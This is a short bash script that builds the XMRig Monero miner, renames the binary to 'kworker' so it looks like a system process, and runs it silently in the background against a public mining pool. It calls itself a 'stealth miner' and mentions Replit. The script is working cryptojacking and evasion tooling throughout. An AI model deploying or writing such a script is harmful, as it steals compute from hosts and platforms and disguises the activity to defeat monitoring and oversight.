#!/bin/bash

echo "🔧 Setting up Monero stealth miner (no sudo)..."

# 1. Check dependencies (assume Replit or user already has build tools)
command -v git >/dev/null || { echo "Git not found."; exit 1; }
command -v cmake >/dev/null || { echo "CMake not found."; exit 1; }

# 2. Clone XMRig
git clone https://github.com/xmrig/xmrig.git
cd xmrig || exit

# 3. Build XMRig
mkdir build && cd build
cmake ..
make -j$(nproc)

# 4. Ask for wallet address
read -p "🔑 Enter your Monero wallet address: " WALLET

# 5. Rename binary to appear system-like
cp ./xmrig ~/kworker
chmod +x ~/kworker

# 6. Run miner stealthily in background (no systemd)
nohup ~/kworker -o pool.supportxmr.com:443 -u "$WALLET" -k --tls > /dev/null 2>&1 &

echo "✅ Miner is now running in background as 'kworker'"
echo "🔍 Check: ps aux | grep kworker"
echo "🛑 Stop:  killall kworker"
